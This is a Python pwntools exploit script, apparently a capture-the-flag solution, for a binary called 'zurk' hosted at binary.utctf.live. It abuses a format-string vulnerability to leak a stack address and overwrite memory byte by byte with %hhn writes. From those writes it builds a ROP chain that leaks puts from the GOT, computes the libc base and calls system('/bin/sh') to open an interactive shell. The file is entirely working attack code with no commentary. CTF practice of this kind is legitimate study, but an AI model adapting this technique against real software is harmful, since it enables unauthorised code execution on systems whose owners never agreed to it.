from pwn import *
import sys

if len(sys.argv) < 2:
	r = process('./zurk')
	puts_offset = 0x06f690
	system_offset = 0x045390
	binsh_offset = 0x18cd57	
else:
	host, port = "binary.utctf.live", 9003
	r = remote(host, port)
	libc = ELF("./libc-2.23.so")
	puts_offset = libc.symbols['puts']
	system_offset = libc.symbols['system']
	binsh_offset = next(libc.search('/bin/sh'))	

raw_input('debug')

rop_pop_rdi = 0x4007e3
rop_pop_rbp = 0x4005f0 
puts_ptl = 0x400520
puts_got = 0x601018
main_add = 0x400686

r.sendlineafter("What would you like to do?", "%14$p")
r.recv(1)
res = r.recv(14)
leak = int(res,16)
log.info("stack = %#x" %leak)

#puts_got
payload = "%" + str(24) + "x%14$hn"
payload += "%" + str(248) + "x%10$hn"
payload += "%" + str(80) + "x%11$hhn"
payload = payload.ljust(32, "a")
payload += p64(leak+1) + p64(leak + 2)
r.sendlineafter("What would you like to do?", payload )

#puts_plt
payload = "%" + str(32) + "x%10$hhn"
payload += "%" + str(229) + "x%11$hhn"
payload = payload.ljust(32, "a")
payload += p64(leak+8) + p64(leak + 9)
r.sendlineafter("What would you like to do?", payload )

payload = "%" + str(64) + "x%10$hhn"
payload += "%" + str(192) + "x%11$hhn"
payload = payload.ljust(32, "a")
payload += p64(leak + 10) + p64(leak + 11)
r.sendlineafter("What would you like to do?", payload )


payload = "%10$hhn"
payload += "%11$hhn"
payload = payload.ljust(32, "a")
payload += p64(leak+12) + p64(leak + 13)
r.sendlineafter("What would you like to do?", payload )

#main_add
payload = "%" + str(134) + "x%10$hhn"
payload += "%" + str(128) + "x%11$hhn"
payload = payload.ljust(32, "a")
payload += p64(leak+16) + p64(leak + 17)
r.sendlineafter("What would you like to do?", payload )


payload = "%" + str(64) + "x%10$hn"
payload = payload.ljust(32, "a")
payload += p64(leak+18)
r.sendlineafter("What would you like to do?", payload )

#rop_rdi

payload = "%" + str(227) + "x%10$hhn"
payload += "%" + str(36) + "x%11$hhn"
payload = payload.ljust(32, "a")
payload += p64(leak - 8) + p64(leak - 7)
r.sendlineafter("What would you like to do?", payload )


r.recvuntil("is not a valid instruction.")
r.recv(1)
res = r.recv(6) + "\x00\x00"
puts_add = u64(res)
log.info("puts %#x" %puts_add)

libc_base = puts_add - puts_offset
system_add = libc_base + system_offset
binsh_add = libc_base + binsh_offset



#new buf 0x601060
add = leak + 0x10
payload = "%" + str(96) + "x%10$hhn"
payload += "%" + str(176) + "x%11$hhn"
payload = payload.ljust(32, "a")
payload += p64(add) + p64(add + 1 )
r.sendlineafter("What would you like to do?", payload )


payload = "%" + str(96) + "x%10$hhn"
payload += "%" + str(160) + "x%11$hhn"
payload = payload.ljust(32, "a")
payload += p64(add + 2) + p64(add + 3)
r.sendlineafter("What would you like to do?", payload )


payload = "%10$hhn"
payload += "%11$hhn"
payload = payload.ljust(32, "a")
payload += p64(add + 4) + p64(add +5)
r.sendlineafter("What would you like to do?", payload )

#0x4006D7 : do_move + 18
add = leak + 0x18
payload = "%" + str(215) + "x%10$hhn"
payload += "%" + str(47) + "x%11$hhn"
payload = payload.ljust(32, "a")
payload += p64(add) + p64(add + 1 )
r.sendlineafter("What would you like to do?", payload )

payload = "%" + str(64) + "x%10$hhn"
payload += "%" + str(192) + "x%11$hhn"
payload = payload.ljust(32, "a")
payload += p64(add + 2) + p64(add + 3 )
r.sendlineafter("What would you like to do?", payload )

payload = "%10$hhn"
payload += "%11$hhn"
payload = payload.ljust(32, "a")
payload += p64(add + 4) + p64(add + 5 )
r.sendlineafter("What would you like to do?", payload )

# ret pop rbp
add = leak + 0x8
payload = "%" + str(240) + "x%10$hhn"
payload += "%" + str(21) + "x%11$hhn"
payload = payload.ljust(32, "a")
payload += p64(add ) + p64(add + 1)
r.sendlineafter("What would you like to do?", payload )


buf = "/bin/sh\x00"
buf += p64(system_add) 
r.sendlineafter("is not a valid instruction.", buf)


r.interactive()
r.close()
#Da xong